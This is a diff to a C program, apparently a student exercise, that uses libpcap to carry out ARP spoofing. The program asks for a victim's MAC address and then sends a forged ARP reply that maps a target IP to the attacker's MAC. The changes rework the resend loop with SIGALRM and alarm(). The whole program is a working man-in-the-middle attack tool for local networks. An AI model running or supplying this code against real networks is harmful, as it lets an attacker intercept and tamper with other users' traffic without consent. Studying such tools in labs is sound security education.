@@ -19,9 +19,11 @@
 #include <linux/ip.h>
 #include <unistd.h>
 #include <stdlib.h> 
+#include <signal.h>
 
 #define ETHERSIZE 14
 #define IPADDRLEN 4
+#define PACKETLEN 0x2a
 
 //--- Struct definition ---
 
@@ -43,6 +45,8 @@ typedef struct myArphdr
 
 //___ Struct definition ___
 
+uint8_t * g_bufAddr;
+pcap_t * g_handle;
 
 //--- Function declaration ---
 
@@ -52,6 +56,7 @@ bool IsARPNext(uint16_t );
 bool IsVictim(uint32_t , uint32_t );
 bool MakeARP(uint8_t , uint8_t * , uint8_t * , uint8_t * , uint32_t , uint32_t );
 void MakeEtherHeader(struct ether_header * , uint8_t * , uint8_t * );
+void Send();
 
 //___ Function declaration ___
 
@@ -77,6 +82,7 @@ int main(int argc, char * argv[])
 
     uint8_t errbuf[PCAP_ERRBUF_SIZE];
     handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, (char *)errbuf);
+    g_handle = handle;
 
     if (handle == NULL) 
     {
@@ -84,8 +90,9 @@ int main(int argc, char * argv[])
         return -1;
     }
 
-    uint8_t buf[0x2a];
+    uint8_t buf[PACKETLEN];
     memset(buf, 0, sizeof(buf));
+    g_bufAddr = buf;
 
     victimIP = inet_addr(argv[2]);
     targetIP = inet_addr(argv[3]);
@@ -98,31 +105,30 @@ int main(int argc, char * argv[])
     
    
     MakeARP(ARPOP_REQUEST,buf, NULL, myMAC, victimIP, myIP);
-   
+    
     
     //get response
     bool getResponse = false;
+    signal(SIGALRM, (__sighandler_t)Send);
+
+    Send();
+
+
     while (!getResponse) 
     {
-        printf("trying to get victime's MAC..\n");
+        struct pcap_pkthdr * header;
+        const uint8_t * packet;
 
-        pcap_sendpacket(handle, (const u_char *)buf, 0x2a);
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
         
-        for(int i =0; i< 100; i++)
-        {
-            struct pcap_pkthdr * header;
-            const uint8_t * packet;
-
-            int res = pcap_next_ex(handle, &header, &packet);
-            if (res == 0) continue;
-            if (res == -1 || res == -2) break;
-            
-            //ARP 응답인지 체크
-            getResponse = GetVictimMAC((uint8_t *)packet, myMAC, victimMAC, victimIP);
-            
-            if(getResponse == true)
-                break;
-        }
+        //ARP 응답인지 체크
+        getResponse = GetVictimMAC((uint8_t *)packet, myMAC, victimMAC, victimIP);
+        
+        if(getResponse == true)
+            break;
+    
     }
 
     printf("success to get victime's MAC!\n");
@@ -136,7 +142,7 @@ int main(int argc, char * argv[])
     MakeARP(ARPOP_REPLY, buf, victimMAC, myMAC, victimIP, targetIP);
 
     printf("do ARP spoofing...\n");
-    pcap_sendpacket(handle, (const u_char *)buf, 0x2a);
+    pcap_sendpacket(handle, (const u_char *)buf, PACKETLEN);
 
     //___ ARP spoofing ___
 
@@ -284,6 +290,16 @@ void MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcM
     eth->ether_type = htons(ETHERTYPE_ARP);
 
 } //void MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)
+
+
+
+void Send()
+{
+    printf("trying to get victime's MAC..\n");
+    pcap_sendpacket(g_handle, (const u_char *)g_bufAddr, PACKETLEN);
+    
+    alarm(10);
+} // void Send()
 
 
 //___ Function definition ___
